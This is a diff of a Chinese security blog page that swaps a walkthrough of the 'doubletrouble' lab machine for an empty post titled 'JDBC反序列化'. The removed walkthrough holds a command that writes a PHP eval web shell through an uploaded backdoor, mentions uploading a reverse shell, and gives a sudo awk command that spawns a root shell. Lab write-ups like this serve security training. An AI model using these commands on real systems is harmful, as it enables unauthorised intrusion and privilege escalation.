@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>doubletrouble靶机通关详解 | Arcueid&#39;s BLOG</title>
+    <title>JDBC反序列化 | Arcueid&#39;s BLOG</title>
     <meta name="author" content="Arcueid" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -155,45 +155,21 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>doubletrouble靶机通关详解</h1>
+        <h1>JDBC反序列化</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2023/8/10
+            2024/7/31
         </span>
         
-        
-        <span class="tags">
-            <span class="icon">
-                <i class="fa-solid fa-tags fa-fw"></i>
-            </span>
-            
-            
-            <span class="tag">
-                
-                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
-            </span>
-            
-            <span class="tag">
-                
-                <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
-            </span>
-            
-        </span>
         
     </div>
     
     <div class="content" v-pre>
-        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/7b934ad50f4f43f6a111332a6ab22dd3.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2b2c328306414f149022bc41553bd9b9.png" alt="在这里插入图片描述"></p>
-<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>扫目录<br>发现secret路径<br>里面有个图<img src="https://img-blog.csdnimg.cn/52e0ef0d0cc24d4f96c48b6f9e5a756c.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/95eff4d90dcd40958ecadccffd02048a.png" alt="在这里插入图片描述"></p>
-<p>qdPM9.1 网上找找exp<br><img src="https://img-blog.csdnimg.cn/afa890ae5a8b4078b99b10d36f71e691.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/766f42bb23c94fe1947dfa10ef0c656f.png" alt="在这里插入图片描述"><br>反弹shell<br><code>http://192.168.0.107//uploads/users/632300-backdoor.php?cmd=echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; 1.php</code><br>蚁剑连上去传php-reverse-shell.php</p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/fafd002e556e42e68a9f1b6be9713d4c.png" alt="在这里插入图片描述"></p>
-<p>发现sudo-l 可以用awk<br><code>sudo awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code><br><img src="https://img-blog.csdnimg.cn/309dc2783dd541ecb205e91a5248aea0.png" alt="在这里插入图片描述"></p>
-
+        
     </div>
     
     
